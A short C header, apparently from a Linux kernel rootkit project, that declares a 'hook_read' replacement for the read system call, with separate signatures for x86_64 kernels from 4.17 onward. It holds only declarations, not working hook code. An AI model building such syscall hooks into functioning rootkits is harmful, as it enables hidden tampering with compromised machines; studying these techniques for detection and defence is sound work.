#ifndef _RK_READ_HOOK_H
#define _RK_READ_HOOK_H

#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <asm/ptrace.h>


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage ssize_t hook_read(const struct pt_regs *regs);
#else
asmlinkage ssize_t hook_read(int fd, void* buf, size_t count);
#endif

#endif
